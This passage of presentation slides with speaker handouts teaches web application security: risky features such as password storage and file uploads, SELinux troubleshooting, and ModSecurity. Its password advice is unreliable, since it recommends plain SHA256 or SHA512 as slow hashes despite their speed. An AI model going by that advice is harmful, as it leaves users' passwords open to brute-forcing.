  implemented in an insecure manner. I call them "AWOOGA!" features --
  that means that warning sirens should be going off in your head
  whenever you either consider writing something like that, or when you
  hear someone say that their software implements one of the "AWOOGA!"
  features.


AWOOGA: Encryption
------------------
.. class:: incremental

* Encryption is easy to get wrong

  * Symmetric? Asymmetric? AES? CBC or CFB?

* "Encrypt data at rest" requirement

  * Key management is very hard
  * Keeping the key with the lock
  * More useful if crypto hardware is used

* Useful if encrypting data passed to the client or 3rd-party

.. container:: handout

  Encryption is a great example of an "AWOOGA" feature because it is so
  easy to get it wrong. Few people have a good understanding of
  cryptography, and unfortunately it is one of those areas where limited
  knowledge unfailingly leads to vulnerable design.

  Encryption is easy to get wrong
    Most developers, unless they have actually invested time to learn
    the basics of cryptography, have very limited understanding of how
    cryptography works. While most are able to tell the difference between
    symmetric and asymmetric encryption, finer details, such as
    encryption algorithms and cipher block modes are usually reserved
    for people to whom cryptography is bread-and-butter. However, if you
    are implementing cryptography in your application, you *really*
    ought to invest plenty of time into familiarizing yourself with some
    core concepts of encryption. There's no lack of good resources on
    the web.

  "Encrypt data at rest" requirement
    A lot of standards bodies require that data is encrypted both in
    transition and at rest -- for example, if your software deals with
    credit cards, your payment processor will require that you comply
    with the PCI DSS standard. One of the items on the list is that all
    confidential data is encrypted when it is stored on disk.

    This is one of those requirements that kinda makes you roll your
    eyes, because what inevitably ends up happening is that the key is
    stored on the same system as the encrypted data. There is no way
    around this -- if the webserver needs to be capable of decrypting
    the data, it has to have access to the decryption key. True, you
    have made it more difficult for the attackers to obtain those credit
    card numbers -- but not by a lot, especially considering the
    financial reward those attackers will rip once they decrypt the
    credit cards.

    Encrypting data at rest becomes more useful if hardware encryption
    mechanisms are used (e.g. in OPAL drives), but still it is only a
    matter of extra effort for attackers to obtain the decryption key.
    There is no way around the fact that if the web server needs to be
    able to decrypt the data, then if the web server is compromised,
    attackers will be able to decrypt your encrypted data.

    At best, at-rest data encryption is a protection against casual
    hacker and won't deter hardened criminals.

  Useful when encrypting for 3rd parties
    Encryption is definitely very useful when you are encrypting data to
    pass to a "3rd party," especially if you have to pass this data to
    the client for later retrieval. Example would be encrypting some
    sensitive data in the cookies. Again, you actually need to know what
    you are doing in order to get it right -- encryption by itself
    doesn't prevent tampering, replaying old messages, etc, etc.


AWOOGA: Password storage
------------------------
.. class:: incremental

* Consider OAuth (Facebook, Google, Twitter, etc)

  * Make password handling "not your problem"
  * Unless you have valid reasons not to use OAuth

* Do NOT use ``md5sum()`` or ``sha1sum()``

  * Easily defeated with "rainbow tables"

* Use salted passwords
* Fast hashing mechanisms are not well-suited

  * Use ``SHA256`` or ``SHA512``
  * PHP *finally* has a native ``crypt()`` hashing function

.. container:: handout

  Nearly all web applications have to deal with storing account
  credential information, if only to separate admin users from regular
  plebs. Very frequently this isn't done right.

  Consider OAuth
    First of all, consider entirely bypassing having to deal with
    passwords, thus saving yourself effort and potential embarrassment.
    OAuth has its set of problems, but from the point of view of
    application developer it offloads the problem of dealing with
    authentication and passwords and makes it someone else's problem.

    There are valid reasons why you wouldn't want to use OAuth -- for
    example, if the data you are trying to secure shouldn't be sitting
    behind the same password that people use for their facebook
    accounts. In that case, read on. If it's an application you wrote
    for company use, you should be using central authentication anyway
    -- hence it's already "not your problem."

  Do NOT use ``md5sum()`` or ``sha1sum``
    This is frighteningly the case in lots and lots of web applications.
    There is inevitably a table in the database called "accounts" which
    contains a username field, and a password field, which is almost
    always a ``varchar(32)`` for the md5 hash of the password.

    The trouble is, md5-hashed passwords are easily defeated by
    so-called "rainbow tables," which are huge lookup tables of hashes
    and corresponding plaintext strings. Unless it's a really, really
    good password (and they rarely are), chances are that an md5 hash of
    it is already in a rainbow table somewhere. And even if it is a really,
    really good password, brute-forcing md5 hashes is becoming dirt-cheap.

  Use salted passwords
    The annoying thing, this is a problem that has been solved many-many
    years ago. All sane systems these days use salted passwords, which
    add a random string to the password before hashing it in order to
    make it unfeasible to use rainbow tables. Don't re-invent the wheel,
    use a crypto library that provides you with a standard way to hash
    and salt a password.

    However, keep in mind -- even if you use salted passwords, there are
    enough weaknesses in md5 and sha1, and plenty of cheap processing
    power available these days to make brute-force lookups
    computationally quite feasible. If it's worth the effort for the
    attacker, they *will* brute-force that password.

  Fast hashing mechanisms are not well-suited
    You actually want to *avoid* using fast hashing mechanisms when
    calculating password hashes. I know it's anathema for developers
    to deliberately pick a slow algorithm for anything, but this makes
    perfect sense for the purposes of password hashing. You only check a
    password hash once during a session, so spending 100 ms instead of 1
    ms on calculating a password hash won't have any impact on your
    app's responsiveness, but it will make it unfeasible for an attacker
    to try to brute-force it.

    Use ``sha256`` or ``sha512``. If you're a hipster, use pbkdf2 or bcrypt
    with lots of rounds (look it up!). PHP 5.3 finally has a native
    ``crypt()`` function that supports new hashing mechanisms -- use it!


AWOOGA: Password resets
-----------------------
.. class:: incremental

* "Personal questions" are backdoors to your system

  .. class:: incremental

  * User-chosen "personal questions" are very weak
  * Or they are too hard and users forget them

    .. class:: incremental

    * What was my favourite movie 3 years ago?
    * Nobody knows how to spell "fuchsia"
    * Was it "Toyota," "Toyota Pickup," or "Tacoma?"

  * Or users defeat them

    * "Dear Mrs. Asdfasdf..."

* Sending password via email?
* Did I mention OAuth?


.. container:: handout

  "Personal questions" are backdoors to your system
    Personal questions are an abomination. It's a poor-man's mechanism
    of adding a "what-you-know" factor to authentication, and it works
    just as conceived -- poorly.

    If users are allowed to pick their own questions, they are
    inevitably something easily guessable, such as "what is your
    mother's maiden name?"

    If questions are pre-set to be non-trivial, then users will forget
    their answers and you will be back to square 1. They are hard
    because people's preferences change. I don't remember what my
    favourite movie was 3 years ago when I set up these "personal
    questions." My favourite colour changes as I get older and crankier,
    too.

    Nobody knows how to spell "fuchsia." Seriously -- there was an XKCD
    comic about that.

    Most frustratingly, there is more than one way to answer the same
    question. My first car was a 91 Toyota Pickup. Did I list it as
    "Toyota," "Toyota Pickup," "91 Toyota Pickup," or "Tacoma?" They are
    all valid answers, but not to the computer.

    Because of frustration with personal questions, users have started
    defeating them by simply answering something like "asdfasdf" to all
    "personal questions," thus creating a quick backdoor into your
    carefully engineered system with an otherwise strong password
    policy.

  Sending password change links via email
    This is still the best way to do it, short of actually calling a
    user on the phone. Don't send actual passwords, of course, send a
    one-time link where a user can change their password. There's always
    a chance that a user's email account has been compromised, but at
    least it's not your problem (unless it is, in which case just have
    help desk call them).

  Did I mention OAuth?
    Speaking of making it "not your problem" -- this is another thing
    that you will avoid if you use OAuth.


AWOOGA: Email from site
-----------------------
.. class:: incremental

* Contact forms are spammer paradise

  * Infamous ``formmail.cgi``

* Hard-coding the recipient limits the problem
* "Captchas" help against bots (a bit)
* Expiring tokens help against bots
* Beware of cheap copy-pasters from "3rd-world"

  * Use "IP tarpitting" if it gets too bad

.. container:: handout

  Contact forms are everywhere, and an amazing number of sites still use
  "formmail.cgi", in its many incarnations. The original version of
  formmail.cgi allowed the site owners to set both the "from" and the
  "to" as part of the form fields, which was responsible for untold
  petabytes of spam throughout the years. Newer incarnations required
  specifying the "to" field inside the script itself, which at least
  reduced the spam recipients to just the site owners themselves.

  We've tried to make spammers' lives more difficult with Captchas, but
  it's a war we've pretty much lost. Adding captchas to your forms has
  very limited effect these days.

  We started adding expiry tokens to forms, which act similar to XSRF
  tokens we went over earlier. This is effective in some cases, but if
  you have a highly trafficked site, spammers will simply hire very
  cheap 3-rd world labour to cut-and-paste spam into your forms.

  If you must have a contact form on your site, have a good
  spam-fighting strategy to go with that.


AWOOGA: File uploads
--------------------
.. class:: incremental

* Do not place uploaded files into web root
* Check file names, if you must do it
* Have a "CYA policy" for malware-infected files

  * Or run a virus-scan on uploaded content

.. container:: handout

  If your site allows users to upload files, make sure you don't place
  those files into the webroot where they can be accessed via an URL. If
  you must do this, make sure you accept only a limited subset of
  extensions (e.g. only .PNG, .JPG, .GIF but not .PHP, .EXE, etc). If
  your environment allows you to do it, actually check the mime-type of
  the submitted content before you accept it, and turn off mod_mime in
  Apache -- otherwise you're running a chance of it recognizing that a
  .JPG is actually a PHP file and executing it.

  Do have a policy of telling your clients that uploaded files will be
  treated as potentially hostile, and run a virus check on them. Have an
  SOP in place to deal with uploaded malware, copyrighted content, or
  plain old porn.


AWOOGA: Templating systems
--------------------------
.. class:: incremental

* Amazing number of them uses ``eval()``
* Those that don't may not properly escape formatting codes from user
  content

.. container:: handout

  If you look at the number of web application vulnerabilities, you will
  notice how many of them deal with various templating engines. There's
  a good reason for that -- templates by their design must be able to
  insert user-provided content, and many of them do it by calling
  "eval()" at some point. When evaluating which templating engine to use
  for your project, do take their security history into consideration.


AWOOGA: Search
--------------
.. class:: incremental

* Database-based search

  * Expression parsing may leave you open to SQL injection attacks
  * May expose non-public content

* Crawler solutions

  * Expose non-public content from IP-restricted sites
  * May leave you exposed to shell injection attacks
  * Or DoS attacks, because they are usually slow

.. container:: handout

  Every good site includes a search function, which can be implemented
  in any number of ways -- commonly either by doing direct database
  queries, by interfacing with a crawler tool or appliance, or by
  outsourcing this whole ordeal to a big-name search engine. If you're
  doing the first two, be mindful of the following things:

  Database-based search
    Aside from being vulnerable to the usual SQL injection attacks,
    database-driven search implementations should be mindful of exposing
    non-public content. Make sure when you're querying the database that
    you're not returning any hits for private pages.

  Crawler solutions
    Similar problems exist with crawler solutions, such as the Google
    Search Appliance. If your site uses any IP-based logic to restrict
    access to pages or documents, make sure your crawler is either aware
    of that, or that its IP is specifically treated as public. Great
    many documents have been exposed to public simply because the
    crawler accessed the site from what it considered to be "internal
    company address."

    Additionally, unless your crawler is really fast, be wary that it
    can inadvertently DoS your site. People like search boxes and will
    use them when found, so slow responses from the crawler may exhaust
    your maxclients setting.


AWOOGA: Installers
------------------
.. class:: incremental

* Usually require a directory writable by httpd
* Are usually left undeleted after installation

  * May have full admin access to reconfigure your site
  * May be full of exploits

.. container:: handout

  Most web software comes with an installer, and while it's convenient,
  it usually requires that you have a webroot directory writable by the
  httpd process. In terms of security, that's a very terrible idea,
  since pretty much any successful code injection vulnerability will
  allow an attacker to install a backdoor.

  Not only that, but very commonly the installers are left around after
  they have completed, and since they aren't treated with as much
  scrutiny as the rest of the web application, they can have sloppy code
  leading to many vulnerabilities, or even allow anyone to reconfigure
  your site.


SELinux: brief introduction
---------------------------
.. class:: incremental

* Mandatory Access Control

  * Difference from "Unix-like" behaviour
  * The parable of water delivery service

* Roadblocks to SELinux adoption

  * Old-school Unix admins
  * Extra work when doing something "non-standard"


Living with SELinux
-------------------
.. class:: incremental

* Familiarize yourself with SELinux
* SELinux is first and foremost a labeling system

  * Every file has a context
  * Everything is a file
  * Must be explicitly allowed to transition

* Majority of problems are due to mislabeling
* Understand ``unconfined`` domains

.. container:: handout

  It is unfortunate that almost a full decade after SELinux was first
  introduced into a mainline Linux distribution, people are still
  treating it as some kind of new-fangled scary-complex technology that
  should be relegated to military installations and ivory towers. In the
  decade that has passed, SELinux has really matured and developed
  plenty of excellent documentation, a robust set of tools and a
  dedicated following. If you've configured iptables and are able to
  wrap your head around such concepts as VLANs and DNS zones -- you are
  certainly bright enough to handle SELinux.

  Familiarize yourself with SELinux
    This is where I'm supposed to recommend a number of books or some
    other materials, but the book I cut my teeth on, "SELinux by
    example," came out in 2006 and is pretty dated by now. You can still
    get it for an excellent introduction on the core concepts, but the
    later chapters might get you frustrated, as the toolchain has
    evolved quite a bit and actual examples may no longer work.

    `Security-Enhanced Linux User Guide`_ published by Red Hat is
    probably the best non-academic resource for learning SELinux. That,
    and `Dan Walsh's blog`_, especially if you want to know what's
    coming in future versions of RHEL.

    .. _`Security-Enhanced Linux User Guide`: http://www.redhat.com/resourcelibrary/datasheets/red-hat-enterprise-linux-6-security-enhanced-linux
    .. _`Dan Walsh's Blog`: http://danwalsh.livejournal.com/

  First and foremost a labeling system
    Learn to rely on the ``-Z`` flags that exist in the majority of base
    tools to discover what SELinux labels are on your files and processes.
    Once SELinux is enabled, every file automatically gets a default
    context. Once files are executed, the context may transition to
    another, but only if that's explicitly allowed (most daemons
    transition into their own domain once executed).

  Majority of problems are due to mislabeling
    If you're getting SELinux denials, chances are something is
    mislabeled. In my experience, most commonly this happens when files
    are ``mv``'d around instead of ``cp``'d -- e.g. you may have
    ``scp``'d a file into your homedir and then ``mv``'d it into
    ``/var/www/html``. The reason it's not working is because the
    context on the file is still ``user_home_t`` -- had you used ``cp``
    instead, it would have gotten the default context for
    ``/var/www/html``, which is ``httpd_sys_content_t``. You quickly
    learn to always use ``cp`` on an SELinux system.

    Another reason why something is mislabelled is because you may be
    trying to run/serve it out of an unusual location (``/opt``,
    ``/group``, ``/myorg``, etc) and therefore it's getting wrong
    labels. We'll go over that later in some more detail.

  Understand ``unconfined`` domains
    The "targetted" policy is the one most commonly used, and it has a
    pretty straightforward approach -- write comprehensive policies for
    the majority of system daemons, and allow everything else to run
    "unconfined." To an unconfined process, SELinux is pretty much in
    permissive mode (unless it transitions to another, confined domain).
    This means that if you write your own daemon and don't bother
    putting together an SELinux policy for it, it'll still work just
    fine, relying solely on classic user- and group-based permissions.


Permissive mode
---------------
.. class:: incremental

* Start with ``permissive mode``
* Blunt approach

  * ``setenforce 0`` on cmdline
  * ``enforcing=0`` boot flag
  * ``/etc/sysconfig/selinux`` file

* Fine-tuning approach

  * ``semanage permissive -a domain_t``
  * Much safer, use instead of ``setenforce 0``

.. container:: handout

  Start with ``permissive mode``
    Unless you're a seasoned SELinux pro, always start out in
    "Permissive mode". This effectively tells SELinux to only detect and
    report violations, but not actually block them. If you do as much
    and don't go any further with SELinux, you've already significantly
    improved your server's security posture, since now you have a very
    detailed audit log of violations that you can use during forensics.

    Permissive mode can be applied either bluntly, to the whole system,
    or selectively, to specific SELinux domains.

  Blunt approach
    You can put the entire OS into SELinux-permissive mode via one of
    three ways:

    1. By issuing ``setenforce 0`` via the commandline. This was
       much-maligned when first introduced, but this command can only
       be issued by an unconfined root user. If someone is already able
       to execute arbitrary commands as unconfined root user on your
       system, ``setenforce 0`` is the last of your worries.
    2. If you can't even boot and suspect that it may be because of
       SELinux labeling gone haywire, you can pass ``enforcing=0`` flag
       to kernel, which will allow you to boot into permissive mode, so
       you can fix your labels.
    3. If you want to make any of the above persistent between reboots,
       the file to modify is /etc/sysconfig/selinux.

  Fine-tuning approach
    The moment you put your system into permissive mode, it loses ALL
    benefits offered by SELinux beyond mere auditing. You really should
    not be using the abovementioned blunt tools to troubleshoot policy
    problems -- a much better approach is to put only the offending
    domain itself into permissive mode and let the rest of the OS
    continue to benefit from SELinux confinement. Find out which domain
    is causing you grief in the audit logs (more on that below), and
    then put it into permissive using:

    .. code-block:: sh

        semanage permissive -a domain_t


Ausearch, audit2why, audit2allow
--------------------------------
.. class:: incremental

* Can solve nearly all your problems
* ``ausearch -ts recent -m avc``
* add ``--raw`` and pipe to:

  * ``audit2why``
  * ``audit2allow``

* ``audit2allow`` can write full policies
* It's not to be used lightly
* Be aware of ``dontaudit`` rules

  * ``semanage dontaudit off``

.. container:: handout

  I can say without any exaggeration that the vast majority of my
  SELinux troubleshooting involves only three tools:

  * ausearch
  * audit2allow
  * audit2why

  ausearch
    Instead of looking directly at files in ``/var/log/audit``, you
    should be using ``ausearch -m avc`` to look at your SELinux denials.
    You should additionally pass the ``-ts`` flag to indicate how far
    back ausearch should be looking. It's both very extensive and very
    finicky about the time formats, so I normally just use ``-ts
    recent`` for recent problems and ``-ts today`` for anything older
    than 10 minutes.

    The primary benefits of using ausearch vs. looking directly at files
    in ``/var/log/audit`` are human-friendly time formats instead of
    timestamps, ability to only look at denials vs. all other audit messages,
    and handy visual cues.

  audit2why
    If you've received an AVC and need help understanding why it's
    happened, you can pipe the output of ``ausearch`` to ``audit2why``
    in order to better understand the problem. It'll get you 90% there,
    most of the time, and is really good at pointing out labeling
    problems.

  audit2allow
    If you've established that your particular problem isn't because of
    a mislabeled file, you can use ``audit2allow`` to create a local
    policy and apply it to allow this or that particular behaviour. It's
    important to note that this shouldn't be used lightly -- you
    actually need to look through your list of AVCs and remove any
    entries that are either unrelated to the domain you're trying to
    secure, or grant permissions that are overbroad.

  Dontaudit rules
    The ``dontaudit`` rules were created in response to common
    false-positive AVCs. For example, almost everything will try to read
    ``/etc/passwd`` or poke around ``/proc``, so SELinux is told to deny
    and not bother recording such AVCs. Unfortunately, sometimes they
    will quietly deny things that actually make your application break,
    so you may find that things are not working despite there not being
    any AVCs generated. In that case, you will need to turn off
    ``dontaudit`` rules using ``semanage dontaudit off`` and see which
    AVCs are being reported.


Stick to default paths
----------------------
.. class:: incremental

* Do not change default file locations

  * Really, it's not worth it
  * Just deep-mount that partition
  * You can add contexts to NFS mounts

* You can assign path equivalence:

  * ``semanage fcontext -a -e /var/www /srv/sites``
  * ``resorecon -Rvvv /srv/sites``

.. container:: handout

  Here's how to avoid most labeling problems:

  Do not change default file locations
    Really, it's not worth it. I know that almost every sysadmin feels
    really strongly about where their files should belong, (``/opt`` vs.
    ``/srv`` vs. ``/group``, vs ``/myorg``, etc) but if you happen to
    value your time and sanity, you'll stick to the locations prescribed
    by the FHS.

    The worst approach is to symlink from the FHS path into another
    toplevel location, such as from ``/var/lib/mysql`` into
    ``/srv/databases/mysql``. Symlinks require their own policy under
    SELinux, so chances are it won't work both because
    ``/srv/databases/mysql`` is not known to SELinux and gets some default
    label instead, and because ``mysqld_t`` doesn't allow accessing symlinks.

    If you must store something on a larger partition, I suggest just
    deep-mounting it where SELinux would expect it.

  Or, you can assign path equivalence
    If deep-mounting is not an acceptable solution to you for various
    reasons, you can tell SELinux that one path is equivalent to another
    path for which a policy exists. For example, if you want all your
    websites in ``/srv/sites`` instead of ``/var/www``, you can issue
    the following command to tell SELinux that ``/srv/sites`` should
    receive the same treatment as ``/var/www``

    .. code-block:: sh

      semanage fcontext -a -e /var/www /srv/sites

  You can NFS-mount with a context
    You can pass a ``context`` parameter when mounting NFS (and some
    other partitions), to assign a local context to the mount. Check out
    ``man mount`` for more info.


There's probably a boolean for that
-----------------------------------
* Sending mail? Accessing the db?

  * There's a boolean for that

.. code-block:: sh

    semanage boolean -l | grep httpd

.. container:: handout

  SELinux booleans are optional SELinux policies that you can
  selectively turn on and off to better tune SELinux to suit your needs.
  Very commonly used daemons, such as Apache, will have lots and lots of
  such booleans to allow or disallow things like sending mail,
  connecting to a database, or running CGIs -- among many others.

  Tools such as ``audit2allow`` and ``audit2why`` will usually
  automatically recognize when a denial can be fixed by flipping a
  boolean flag, which is another good reason to always check them first.

  You should examine the output of ``semanage boolean -l`` for the list
  of all available booleans and a terse description of what they do.
  Some of them are on by default, but don't need to be, so remember that
  you should use ``setsebool`` to both allow non-default functionality,
  and turn off the stuff that doesn't need to be on.


SELinux and web apps
--------------------
.. class:: incremental

* Limited usefulness when running scripts as part of httpd

  * Httpd daemon vulnerabilities
  * Code injection attacks
  * Curious users poking around

* Much more powerful when used with CGI/FCGI scripts

  * Allows ``httpd_t`` to transition to another domain
  * Subject of our hands-on session

.. container:: handout

  Limited usefulness for builtin scripting
    If you are running mod_php (and who isn't), mod_perl or any other
    builtin Apache module, anything executed by that module will run
    within the main httpd context, ``httpd_t``. While this wouldn't really
    matter in an environment where Apache handles just one site, if
    you are trying to host more than one application on the same httpd
    server, you will have to grant Apache the summary of all
    permissions. In other words, if you have 20 web apps and only one of
    them needs to be able to connect to some random port on the web for
    a REST call, you will have to allow ``httpd_can_network_connect``
    and therefore ALL 20 of your web applications will be able to connect
    to random ports on the internet.

    This doesn't mean that SELinux is useless in this case -- you're
    still erecting a pretty good defence against vulnerabilities in the
    httpd daemon, restricting potential code injection attacks, and
    generally reducing what users can access on a Linux system.

  Much more handy when the process transitions to its own domain
    When Apache executes a CGI/FCGI application, it is able to
    transition from its core SELinux domain (``httpd_t``) to the
    application's own domain. This allows to sandbox an application much
    more tightly, and only grant permissions required by each
    application.


Essential httpd file contexts
-----------------------------
:``httpd_sys_content_t``:     Read-only website content
:``httpd_sys_rw_content_t``:  Files that can be modified by httpd
:``httpd_sys_script_exec_t``: CGI executables
:``public_content_rw_t``:     Blanket type for all other public content


Setting contexts with semanage
------------------------------
* Do not use ``chcon`` for permanent labels
* To allow httpd to read content in ``/web``:

.. code-block:: sh

  semanage fcontext -a -t httpd_sys_content_t \
    "/web(/.*)?"

* To allow httpd to write to ``/web/config``:

.. code-block:: sh

  semanage fcontext -a -t httpd_sys_rw_content_t \
    "/web/config(/.*)?"


Essential httpd-related booleans
--------------------------------
:``httpd_builtin_scripting``:      Enable mod_php and similar systems
:``httpd_can_network_connect``:    Allow httpd to open network sockets
:``httpd_can_network_connect_db``: Allow httpd to open network socket
                                   to a db server
:``httpd_can_sendmail``:           Allow httpd to invoke sendmail


Essential httpd booleans (contd)
--------------------------------
:``httpd_enable_cgi``:      Allow httpd to execute CGI scripts
:``httpd_enable_homedirs``: Allow httpd to access user content in
                            ``~/public_html``
:``httpd_tty_comm``:        Allow httpd access to tty
                            (passphrase-protected SSL certificates)
:``httpd_use_nfs``:         Allow httpd to access nfs-mounted partitions


ModSecurity: what it is
-----------------------
* "Web Application Firewall" (WAF)
* Analysis of HTTP traffic at the Apache level

  * Restrict HTTP methods
  * Analyze and enforce payload compliance
  * Stop attacks before they get to your web apps


ModSecurity: what it is NOT
---------------------------
* NOT a magic wand that makes you secure
* NOT for the lazy
* NOT for the faint of heart
* 3rd-party app owners will NOT be amused


Paranoid vs. Heuristic approach
-------------------------------
* Write your own rules from scratch
* Use pre-written rules in "paranoid mode"
* Use a combination of both
* Use pre-written rules with "threshold scoring"


ModSecurity: paranoid approach
------------------------------
* Write rules from scratch

  * Allows you to enforce payload schemas
  * Not suitable for large existing apps

* Pre-written rules in "paranoid mode"

  * "Password may not contain the word SELECT"


ModSecurity: heuristic approach
-------------------------------
* Understand security thresholds
* Review and understand pre-written rules

  * Let's take a look now
  * ``/etc/httpd/modsecurity.d``


ModSecurity: tweaking rules
---------------------------
* Avoid modifying default rules

  * Upgrades will become a mess

* Use ``SecRuleRemoveBy*`` to turn off rules
* Use ``SecRuleUpdateTargetBy*`` to modify core rules

  * Add exceptions based on various criteria

ModSecurity: also good for
--------------------------
* Detailed audit information

  * Always logs full headers
  * Can log POST body (but think twice!)

* Can scan outgoing data

  * Add "fakeuserpassword" into your password table
  * Abort response if that string is seen in body

PHP: mod_suphp
--------------
* Will execute php scripts with file owner rights

  * Excluding anything below userid < 500 (configurable)

* Can ``chroot`` php scripts before executing

  * Can ``chroot`` to ``$HOME``

* Nice tool for multi-site hosting
* Runs as part of httpd_t domain

Tools
-----
* Most "vulnerability scanners" will only check for known
  vulnerabilities or known outdated software

  * Nikto scanner

* Ratproxy

  * Analyzes traffic and offers suggestions
  * Can do SSL


Summary
-------
* All security is trade-off in terms of:

  * Effort
  * Money
  * Usability

* Know that you are made of meat

  * Your boss and co-workers are made of meat, too

* Be prepared when things fail

  * Use multiple layers of security
